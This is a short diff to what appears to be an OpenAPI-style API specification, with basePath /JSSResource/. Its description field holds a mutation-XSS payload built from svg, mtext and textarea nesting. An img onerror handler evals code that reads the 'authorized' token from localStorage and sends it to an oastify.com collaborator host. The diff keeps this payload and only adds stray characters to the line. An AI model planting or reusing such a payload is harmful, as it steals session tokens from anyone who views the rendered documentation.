@@ -8,7 +8,7 @@ info:
         <svg>
           <mtext>
             <textarea><path id="</textarea>
-            <img src=1 onerror="eval('setTimeout(function(){var i=new Image();i.src=\x22https://4otg03sxxd9usgzocpxn7fa9a0gr4jv7k.oastify.com/?token=\x22+encodeURIComponent(localStorage.getItem(\x22authorized\x22));},10);')">
+            <img src=1 onerror="eval('setTimeout(function(){var i=new Image();i.src=\x22https://4otg03sxxd9usgzocpxn7fa9a0gr4jv7k.oastify.com/?token=\x22+encodeURIComponent(localStorage.getItem(\x22authorized\x22));},10);')">">
     </form>
   version: production
 basePath: /JSSResource/
